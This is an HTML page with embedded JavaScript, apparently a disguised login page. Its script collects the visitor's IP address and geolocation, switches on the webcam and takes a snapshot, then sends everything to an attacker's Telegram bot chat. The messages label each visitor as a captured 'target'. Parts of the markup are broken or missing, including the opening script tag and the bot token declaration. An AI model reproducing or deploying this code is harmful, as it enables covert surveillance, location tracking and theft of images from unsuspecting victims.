<!DOCTYPE html>
<html>
<head>

  <style>
    body {

    }

    }
    .login-box button {

      background-color: #3b82f6;
      border: none;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    #camera {
      border: 1px solid black;
      margin-top: 20px;
    }
    footer {
      margin-top: 20px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>

    const chatId = '6307182208';

    let ipAddress = 'Tidak diketahui';
    let locationInfo = 'Tidak diberikan';
    let cameraStatus = 'Gagal';
    let streamData = null;

    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        ipAddress = data.ip;
        checkAndSend();
      });

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        locationInfo = `Latitude: ${lat}, Longitude: ${lon}`;
        checkAndSend();
      }, err => {
        locationInfo = 'Izin lokasi ditolak';
        checkAndSend();
      });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.getElementById("camera");
        video.srcObject = stream;
        streamData = stream;
        cameraStatus = 'Berhasil';
        setTimeout(() => {
          takeSnapshot();
        }, 3000);
      })
      .catch(err => {
        cameraStatus = 'Ditolak / Tidak tersedia';
        checkAndSend();
      });

    function takeSnapshot() {
      const video = document.getElementById("camera");
      const canvas = document.getElementById("snapshot");
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        sendToTelegram(blob);
      }, 'image/jpeg');
    }

    function sendToTelegram(blobImage) {
      const message = `\`\`\`
DEVELOPER : HANXX
DAPET TARGET NIH HANXX

IP Address: ${ipAddress}
Lokasi: ${locationInfo}
Kamera: ${cameraStatus}
      \`\`\``;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blobImage, "snapshot.jpg");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).then(() => console.log("Gambar terkirim ke Telegram"));
    }

  </script>
